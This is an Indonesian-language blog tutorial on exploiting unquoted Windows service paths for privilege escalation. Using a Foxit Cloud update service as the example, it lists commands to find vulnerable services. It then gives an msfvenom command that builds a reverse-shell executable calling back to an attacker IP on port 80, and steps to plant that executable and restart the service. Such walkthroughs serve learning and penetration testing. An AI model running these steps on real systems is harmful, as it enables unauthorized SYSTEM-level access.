---
title: 'Unquoted Service Paths'
date: 2022-05-29 14:15:22 +0700
categories: [Windows, Privilege Escalations]
tags: [windows, privilege escalation]     # TAG names should always be lowercase
author: nairpaa
---

**Unquoted Service Paths** adalah ketika PATH binary dari suatu layanan mengandung spasi dengan tidak menggunakan kutip. 

Contoh dari **Unquoted Service Paths** adalah `C:\Program Files\Ignite Data\Vuln Service\file.exe`.

Untuk mengakses `file.exe`, sistem akan membaca jalur PATH dalam urutan seperti berikut:

```powershell
C:\Program.exe #percobaan akses 1
C:\Program Files\Ignite.exe #percobaan akses 2
C:\Program Files\Ignite Data\Vuln.exe #percobaan akses 3
C:\Program Files\Ignite Data\Vuln Service\file.exe #percobaan akses 4
```

Jika kita memiliki hak akses *write* pada `C:\Program Files\Ignite Data\`, kita dapat menyisipkan *malicious file executable* (`C:\Program Files\Ignite Data\Vuln.exe`) untuk dijalankan oleh user yang menjalankan service tersebut.

## Tahapan Eksploitasi

### Step 1: Cek service paths

Tools:
- Winpeas
- PowerUp.ps1

Manual:

```powershell
PS > wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

### Step 2: Cek start type

Contoh kali ini *start type*-nya  adalah *auto start*.
```powershell
PS C:\Users\Ap> sc qc FoxitCloudUpdateService
sc qc FoxitCloudUpdateService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: FoxitCloudUpdateService
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Foxit Cloud Safe Update Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```


### Step 3: Buat file .exe dan upload ke service path

```bash
➜ lpe msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.73 LPORT=80 -f exe -o Foxit.exe  
```

Contoh: **Foxit.exe** disimpan di "`C:\Program Files (x86)\Foxit Software`".

```powershell
C:\Program Files (x86)\Foxit Software>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Program Files (x86)\Foxit Software

11/05/2021  11:09 PM    <DIR>          .
11/05/2021  11:09 PM    <DIR>          ..
10/07/2015  04:05 AM    <DIR>          Foxit Reader
11/05/2021  11:09 PM            73,802 Foxit.exe
               1 File(s)         73,802 bytes
               3 Dir(s)  13,053,509,632 bytes free
```

### Step 4: Jalankan service

```powershell
C:\Program Files (x86)\Foxit Software> sc start <service> # jika punya hak akses start service
C:\Program Files (x86)\Foxit Software> shutdown /r /t 10 # jika autorun, retart + delay 10 detik
```


---

### Referensi

- https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
- [Foxit Reader 7.0.6.1126](https://www.exploit-db.com/exploits/36390)
- https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/